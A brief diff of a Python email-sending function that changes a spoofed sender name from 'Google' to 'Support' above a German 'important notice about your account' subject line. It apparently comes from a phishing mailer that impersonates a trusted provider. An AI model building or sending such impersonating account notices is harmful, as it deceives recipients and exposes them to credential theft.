@@ -230,7 +230,7 @@ def send_email():
     try:
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
-        headers = "\r\n".join(["from: " + "Google" + " <" + "jh.temp.04@gmail.com" + ">",
+        headers = "\r\n".join(["from: " + "Support" + " <" + "jh.temp.04@gmail.com" + ">",
                                "subject: Wichtige Mitteilung bezüglich Ihres Kontos",
                                "to: " + adress,
                                "mime-version: 1.0",
